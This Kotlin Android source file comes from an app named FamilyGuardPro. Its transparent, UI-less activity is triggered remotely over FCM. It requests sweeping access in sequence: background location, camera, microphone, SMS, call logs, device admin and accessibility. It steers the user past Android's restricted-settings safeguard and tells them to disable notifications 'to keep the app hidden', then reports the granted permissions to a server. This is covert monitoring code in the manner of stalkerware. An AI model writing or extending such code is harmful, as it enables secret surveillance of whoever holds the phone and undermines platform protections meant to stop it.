package com.familyguardpro

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.familyguardpro.services.DeviceAdminReceiver
import com.familyguardpro.utils.PermissionReporter
import com.familyguardpro.utils.PermissionsHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Transparent Activity to handle permission requests triggered from parent dashboard via FCM
 */
class PermissionRequestActivity : AppCompatActivity() {
    
    companion object {
        private const val TAG = "PermissionRequestActivity"
        const val EXTRA_PERMISSION_TYPE = "permission_type"
        const val EXTRA_REQUEST_ALL = "request_all"
        
        // Permission types
        const val PERMISSION_LOCATION = "location"
        const val PERMISSION_BACKGROUND_LOCATION = "background_location"
        const val PERMISSION_CAMERA = "camera"
        const val PERMISSION_MICROPHONE = "microphone"
        const val PERMISSION_CONTACTS = "contacts"
        const val PERMISSION_SMS = "sms"
        const val PERMISSION_CALL_LOG = "call_log"
        const val PERMISSION_STORAGE = "storage"
        const val PERMISSION_PHONE = "phone"
        const val PERMISSION_NOTIFICATION = "notification"
        const val PERMISSION_USAGE_ACCESS = "usage_access"
        const val PERMISSION_OVERLAY = "overlay"
        const val PERMISSION_BATTERY_OPTIMIZATION = "battery_optimization"
        const val PERMISSION_DEVICE_ADMIN = "device_admin"
        const val PERMISSION_ACCESSIBILITY = "accessibility"
        const val PERMISSION_RESTRICTION_SETTINGS = "restriction_settings"
        const val PERMISSION_DISABLE_APP_NOTIFICATIONS = "disable_app_notifications"
        const val PERMISSION_ALL = "all"
        
        private const val REQUEST_CODE_PERMISSIONS = 1001
        private const val REQUEST_CODE_SETTINGS = 1002
    }
    
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private var pendingPermissions = mutableListOf<String>()
    private var currentPermissionIndex = 0
    private var requestAll = false
    
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val allGranted = results.values.all { it }
        Log.d(TAG, "Permission results: $results, all granted: $allGranted")
        
        if (requestAll) {
            currentPermissionIndex++
            requestNextPermission()
        } else {
            reportPermissionsAndFinish()
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Make activity transparent - no UI needed
        window.setBackgroundDrawableResource(android.R.color.transparent)
        
        val permissionType = intent.getStringExtra(EXTRA_PERMISSION_TYPE)
        requestAll = intent.getBooleanExtra(EXTRA_REQUEST_ALL, false)
        
        Log.d(TAG, "Permission request activity started. Type: $permissionType, requestAll: $requestAll")
        
        if (requestAll || permissionType == PERMISSION_ALL) {
            requestAll = true
            setupAllPermissionsList()
            requestNextPermission()
        } else if (permissionType != null) {
            requestSinglePermission(permissionType)
        } else {
            Log.e(TAG, "No permission type specified")
            finish()
        }
    }
    
    private fun setupAllPermissionsList() {
        pendingPermissions.clear()
        
        // Add all permission types in order
        if (!hasLocationPermission()) pendingPermissions.add(PERMISSION_LOCATION)
        if (!hasCameraPermission()) pendingPermissions.add(PERMISSION_CAMERA)
        if (!hasMicrophonePermission()) pendingPermissions.add(PERMISSION_MICROPHONE)
        if (!hasCallLogPermission()) pendingPermissions.add(PERMISSION_CALL_LOG)
        if (!hasStoragePermission()) pendingPermissions.add(PERMISSION_STORAGE)
        if (!hasPhonePermission()) pendingPermissions.add(PERMISSION_PHONE)
        if (!PermissionsHelper.hasNotificationListenerPermission(this)) pendingPermissions.add(PERMISSION_NOTIFICATION)
        if (!PermissionsHelper.hasUsageStatsPermission(this)) pendingPermissions.add(PERMISSION_USAGE_ACCESS)
        if (!PermissionsHelper.hasOverlayPermission(this)) pendingPermissions.add(PERMISSION_OVERLAY)
        if (!isBatteryOptimizationDisabled()) pendingPermissions.add("battery")
        if (!PermissionsHelper.hasAccessibilityAccess(this)) pendingPermissions.add(PERMISSION_ACCESSIBILITY)
        // Always add disable app notifications at the end
        pendingPermissions.add(PERMISSION_DISABLE_APP_NOTIFICATIONS)
        
        currentPermissionIndex = 0
        Log.d(TAG, "Pending permissions: $pendingPermissions")
    }
    
    private fun requestNextPermission() {
        if (currentPermissionIndex >= pendingPermissions.size) {
            Log.d(TAG, "All permissions processed")
            reportPermissionsAndFinish()
            return
        }
        
        val permissionType = pendingPermissions[currentPermissionIndex]
        Log.d(TAG, "Requesting permission $currentPermissionIndex: $permissionType")
        requestSinglePermission(permissionType)
    }
    
    private fun requestSinglePermission(permissionType: String) {
        when (permissionType) {
            PERMISSION_LOCATION -> requestLocationPermission()
            PERMISSION_BACKGROUND_LOCATION -> requestBackgroundLocationPermission()
            PERMISSION_CAMERA -> requestCameraPermission()
            PERMISSION_MICROPHONE -> requestMicrophonePermission()
            PERMISSION_CONTACTS -> requestContactsPermission()
            PERMISSION_SMS -> requestSmsPermission()
            PERMISSION_CALL_LOG -> requestCallLogPermission()
            PERMISSION_STORAGE -> requestStoragePermission()
            PERMISSION_PHONE -> requestPhonePermission()
            PERMISSION_NOTIFICATION -> requestNotificationAccess()
            PERMISSION_USAGE_ACCESS -> requestUsageAccess()
            PERMISSION_OVERLAY -> requestOverlayPermission()
            PERMISSION_BATTERY_OPTIMIZATION, "battery" -> requestBatteryOptimization()
            PERMISSION_DEVICE_ADMIN -> requestDeviceAdmin()
            PERMISSION_ACCESSIBILITY -> requestAccessibility()
            PERMISSION_RESTRICTION_SETTINGS -> requestRestrictionSettings()
            PERMISSION_DISABLE_APP_NOTIFICATIONS -> requestDisableAppNotifications()
            else -> {
                Log.w(TAG, "Unknown permission type: $permissionType")
                if (requestAll) {
                    currentPermissionIndex++
                    requestNextPermission()
                } else {
                    finish()
                }
            }
        }
    }
    
    private fun requestLocationPermission() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        
        // Add background location for Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        
        permissionLauncher.launch(permissions.toTypedArray())
    }
    
    private fun requestBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // First check if foreground location is granted
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                permissionLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
            } else {
                // Request foreground location first
                permissionLauncher.launch(arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ))
            }
        } else {
            // On older Android, just request regular location
            permissionLauncher.launch(arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ))
        }
    }
    
    private fun requestCameraPermission() {
        permissionLauncher.launch(arrayOf(Manifest.permission.CAMERA))
    }
    
    private fun requestMicrophonePermission() {
        permissionLauncher.launch(arrayOf(Manifest.permission.RECORD_AUDIO))
    }
    
    private fun requestContactsPermission() {
        permissionLauncher.launch(arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS
        ))
    }
    
    private fun requestSmsPermission() {
        permissionLauncher.launch(arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        ))
    }
    
    private fun requestCallLogPermission() {
        permissionLauncher.launch(arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG
        ))
    }
    
    private fun requestStoragePermission() {
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            )
        } else {
            arrayOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            )
        }
        permissionLauncher.launch(permissions)
    }
    
    private fun requestPhonePermission() {
        val permissions = mutableListOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.ANSWER_PHONE_CALLS)
        }
        permissionLauncher.launch(permissions.toTypedArray())
    }
    
    private fun requestNotificationAccess() {
        Toast.makeText(this, "Please enable notification access for FamilyGuard", Toast.LENGTH_LONG).show()
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        startActivityForResult(intent, REQUEST_CODE_SETTINGS)
    }
    
    private fun requestUsageAccess() {
        Toast.makeText(this, "Please enable usage access for FamilyGuard", Toast.LENGTH_LONG).show()
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        startActivityForResult(intent, REQUEST_CODE_SETTINGS)
    }
    
    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Toast.makeText(this, "Please enable overlay permission for FamilyGuard", Toast.LENGTH_LONG).show()
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            startActivityForResult(intent, REQUEST_CODE_SETTINGS)
        } else {
            if (requestAll) {
                currentPermissionIndex++
                requestNextPermission()
            } else {
                finish()
            }
        }
    }
    
    private fun requestBatteryOptimization() {
        Toast.makeText(this, "Please disable battery optimization for FamilyGuard", Toast.LENGTH_LONG).show()
        
        // First try the direct request
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivityForResult(intent, REQUEST_CODE_SETTINGS)
        } catch (e: Exception) {
            // If direct request fails, redirect to app's battery usage settings
            try {
                Toast.makeText(this, "Please go to Battery and set to 'Unrestricted'", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, REQUEST_CODE_SETTINGS)
            } catch (e2: Exception) {
                // Last fallback: open battery settings
                val intent = Intent(Settings.ACTION_BATTERY_SAVER_SETTINGS)
                startActivityForResult(intent, REQUEST_CODE_SETTINGS)
            }
        }
    }
    
    private fun requestDeviceAdmin() {
        val adminReceiver = ComponentName(this, DeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminReceiver)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Enable device admin for security features"
            )
        }
        startActivityForResult(intent, REQUEST_CODE_SETTINGS)
    }
    
    private var lastRequestedPermission: String? = null
    
    private fun requestAccessibility() {
        lastRequestedPermission = PERMISSION_ACCESSIBILITY
        Toast.makeText(this, "Please enable accessibility service for FamilyGuard", Toast.LENGTH_LONG).show()
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivityForResult(intent, REQUEST_CODE_SETTINGS)
    }
    
    private fun requestRestrictionSettings() {
        lastRequestedPermission = PERMISSION_RESTRICTION_SETTINGS
        Toast.makeText(this, "Please allow restricted settings for this app", Toast.LENGTH_LONG).show()
        // Open App Info page where user can enable "Allow restricted settings"
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
        }
        startActivityForResult(intent, REQUEST_CODE_SETTINGS)
    }
    
    private fun requestDisableAppNotifications() {
        lastRequestedPermission = PERMISSION_DISABLE_APP_NOTIFICATIONS
        Toast.makeText(this, "Disable notifications to keep the app hidden", Toast.LENGTH_LONG).show()
        // Open app notification settings
        try {
            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            }
            startActivityForResult(intent, REQUEST_CODE_SETTINGS)
        } catch (e: Exception) {
            // Fallback to app details settings
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivityForResult(intent, REQUEST_CODE_SETTINGS)
        }
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        Log.d(TAG, "onActivityResult: requestCode=$requestCode, resultCode=$resultCode")
        
        if (requestCode == REQUEST_CODE_SETTINGS) {
            // Give the system a moment to update permission state
            scope.launch {
                delay(500)
                
                // Check if accessibility was requested but not enabled
                if (lastRequestedPermission == PERMISSION_ACCESSIBILITY && 
                    !PermissionsHelper.hasAccessibilityAccess(this@PermissionRequestActivity)) {
                    // Accessibility still not enabled, prompt for restricted settings
                    Log.d(TAG, "Accessibility not enabled, prompting for restricted settings")
                    Toast.makeText(
                        this@PermissionRequestActivity,
                        "Accessibility could not be enabled. Please allow restricted settings first.",
                        Toast.LENGTH_LONG
                    ).show()
                    delay(1000)
                    requestRestrictionSettings()
                    return@launch
                }
                
                if (requestAll) {
                    currentPermissionIndex++
                    requestNextPermission()
                } else {
                    reportPermissionsAndFinish()
                }
            }
        }
    }
    
    private fun reportPermissionsAndFinish() {
        // Report updated permissions to server
        val app = applicationContext as? FamilyGuardApp
        val deviceId = app?.preferenceManager?.getDeviceId()
        
        if (deviceId != null) {
            scope.launch {
                try {
                    PermissionReporter.reportPermissions(this@PermissionRequestActivity)
                    Log.d(TAG, "Permissions reported to server")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to report permissions", e)
                }
                finish()
            }
        } else {
            finish()
        }
    }
    
    // Permission check helpers
    private fun hasLocationPermission() = ContextCompat.checkSelfPermission(this, 
        Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
    
    private fun hasCameraPermission() = ContextCompat.checkSelfPermission(this, 
        Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    
    private fun hasMicrophonePermission() = ContextCompat.checkSelfPermission(this, 
        Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
    
    private fun hasCallLogPermission() = ContextCompat.checkSelfPermission(this, 
        Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
    
    private fun hasPhonePermission() = ContextCompat.checkSelfPermission(this, 
        Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
    
    private fun hasStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    private fun isBatteryOptimizationDisabled(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }
}
